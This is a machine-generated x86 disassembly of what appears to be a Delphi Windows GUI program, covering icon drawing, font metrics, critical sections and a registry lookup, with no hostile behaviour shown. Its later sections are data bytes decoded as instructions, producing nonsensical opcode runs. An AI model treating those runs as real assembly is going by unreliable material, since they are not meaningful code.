mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_427500
cmp [ esi + 0x39 ] 0x1
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_427500
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_46f45c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax esi
call sub_471bb0
mov eax [ esp + 0x4 ]
add eax eax
add eax eax
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_472e6c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_471d2c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4707bc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_472ee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_470e20
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472f0c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_471d2c
mov eax [ ebx + 0x28 ]
cmp esi [ eax + 0x1c ]
jne r-xdata
push esi
push edi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_47124c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp edi [ eax + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_472f6c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4705b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_472fb4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_46fe44
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4705e0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_473008
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_4705e4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_473038
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_473344
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_4705e0
mov eax [ esi + 0x28 ]
call sub_4705e4
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_424dc0
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_473098
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax esi
call sub_46e9a4
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4730f4
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_473108
push ebx
mov ebx eax
mov edx [ ebx + 0x28 ]
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
pop ebx
retn
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0xc
call GetSystemMetrics
mov eax ebx
call sub_473160
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
jmp r-xdata
sub_473134
push ebx
mov ebx eax
mov edx [ ebx + 0x28 ]
mov eax [ edx + 0xc ]
test eax eax
jne r-xdata
pop ebx
retn
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0xc
call GetSystemMetrics
mov eax ebx
call sub_473160
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
jmp r-xdata
sub_473160
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_427294
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0x8 ]
call sub_4274c8
movzx eax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x14 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0xc ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_46f70c
jmp r-xdata
jmp r-xdata
call sub_46ebb8
sub_4731d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473265
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4730f4
cmp eax [ rw-data ]
jne r-xdata
call sub_46ebb8
mov eax esi
call sub_4730f4
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_46fc44
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_447ae4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_427500
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_47328c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47331a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_427274
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_4274c8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4274c8
movzx eax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_473344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_46ebb8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47331f
mov eax [ ebp - 0x4 ]
call sub_4481b0
call sub_448ca8
call sub_448cfc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473344
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473384
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4705e0
mov eax [ ebx + 0x28 ]
call sub_4705e4
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4733b8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_473344
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetIconInfo
test eax eax
je r-xdata
xor edx edx
push ebp
push sub_473435
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x30 ]
push eax
push 0x18
mov eax [ ebp - 0x8 ]
push eax
call GetObjectW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x28 ]
mov [ eax + 0x10 ] edx
sub_4734a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4731d8
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_427500
pop esi
pop ebx
retn
sub_4734f0
push ebp
mov ebp esp
push ecx
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473535
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x5a
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47353c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
sub_473554
push ebx
push esi
add esp 0xffffffc4
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x3c
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsW
test eax eax
je r-xdata
movzx ebx [ esp + 0x38 ]
sub_473598
push ebp
mov ebp esp
add esp 0xfffffef8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473696
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ca8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473653
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
call sub_430d48
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_430dac
test al al
je r-xdata
call sub_473554
cmp al 0x80
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47365a
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_430ff8
mov eax [ ebp - 0x8 ]
call sub_430d18
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_449d80
sub_47365a
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47369d
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_44bc1c
lea edx [ ebp - 0x108 ]
mov eax rw-data
mov cl 0x7c
call sub_447a58
sub_47374f
dec [ esi ]
add [ eax ] al
add [ ebp ] cl
push ebx
add [ eax ] ah
add [ ebx ] dl
push 0x6c006500
add [ eax + eax + 0x20 ] ch
add [ eax + eax + 0x6c ] al
add [ edi ] ah
and [ eax ] al
xor al [ eax ]
add [ eax ] al
add [ eax ] al
int3
sub_473778
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4737dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_473814
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_473a0c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_473858
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_473840
xor eax eax
push ebp
push sub_4738f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473900
mov eax [ ebp - 0x4 ]
call sub_47384c
retn
mov eax 0x10
call sub_44748c
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_47390c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_47390c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4739eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x8 ]
call sub_4719a8
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_46e058
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_46df1c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
xor edx edx
xor eax eax
call sub_432a2c
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_46e300
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_46e880
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_471344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473a0c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_473840
xor eax eax
push ebp
push sub_473a59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a60
mov eax [ ebp - 0x4 ]
call sub_47384c
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473a60
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4474a8
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
jne r-xdata
mov eax esi
call sub_4481b0
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_473840
xor eax eax
push ebp
push sub_473a59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a60
mov eax [ ebp - 0x4 ]
call sub_47384c
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473a8c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_46cf24
push eax
mov eax ebx
call sub_46cf24
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_473858
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_473ac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_473b8d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473b94
retn
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
call sub_4481b0
call sub_47029c
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
call sub_4481b0
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_44a7e8
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_44a7e8
sub_473b98
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4734f0
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconW
mov [ rw-data ] eax
call sub_473598
mov cx 0x8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_46c39c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_46c39c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_46c39c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4737dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4249e8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4249e8
mov [ rw-data ] eax
mov ecx sub_46cf34
mov edx sub_46cf44
mov eax [ r-xdata ]
call sub_423ecc
mov ecx r-xdata
mov edx sub_46d2a4
mov eax [ r-xdata ]
call sub_423ecc
sub_473e70
clc
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
mov al 0x79
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
insb
push esi
inc esp
add [ eax ] bh
add [ eax ] al
dec eax
jns r-xdata
add [ edx + edi * 2 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
sbb [ gs : esi + 0x44 ] dl
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
nop
nop
pop eax
aas
inc edi
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
[ 0x1ff0000 ]
insb
push esi
inc esp
add [ eax ] dh
add [ eax ] al
[ ecx + edi * 2 + 0x47 ]
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ab401c
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edi + 0x47 ] dl
add [ eax ] cl
ja r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
sbb [ bp + 0x44 ] dl
sbb [ esi + 0x44 ] dl
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax + eax + 0x64 ] 0xbc004481
jl r-xdata
dec esi
outsd
jb r-xdata
dec ecx
add [ esi ] bh
dec ecx
add ah ah
into
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
add [ eax - 0x7f ] cl
inc esp
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
sub [ ebx ] 0x49
add al al
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc edi
add [ eax + 0x1400477d ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + 0x7d ] ch
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
inc edi
add [ eax ] bl
add [ edi ] 0x4c
add [ edi ] 0x6
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax ] al
sub eax 0x7cf80049
inc edi
add al al
sub [ ecx ] ecx
or [ ebp + 0x47 ] bh
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax + 0x48004783 ] cl
jge r-xdata
push eax
dec ecx
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd447893b
jle r-xdata
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec ecx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
jae r-xdata
add [ eax ] al
adc [ eax ] 0x0
cmovg ebp [ esi + 0x41 ]
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
outsd
insb
nop
sbb al 0x41
inc edi
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ esp + edi * 2 + 0x755c0047 ] bh
dec ecx
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esp + edi * 2 + 0x47 ] al
add [ eax - 0x73ffb691 ] al
jne r-xdata
add [ eax + eax ] bl
add bh bh
sbb al 0x7a
inc edi
imul ebp [ ecx + 0x6e ] 0x67
sbb [ esi + 0x44 ] dl
nop
hlt
add [ eax ] al
add [ eax ] al
add eax 0xec000000
outsd
outsb
insb
cmp eax 0x2600047
add bh bh
add [ edi + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d0011 ] al
outsd
jb r-xdata
outsd
insb
hlt
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
and eax 0x12300049
jae r-xdata
add ah bl
inc ebx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
outsd
or al 0x62
cmp eax 0x2640047
add bh bh
adc [ edi + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d0012 ] al
jb r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
inc ecx
inc edi
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add ah ch
nop
nop
aam 0x42
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 2 + 0x43ca0047 ] bh
inc edi
add [ edx + eax + 0x3f9c0000 ] al
inc edi
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
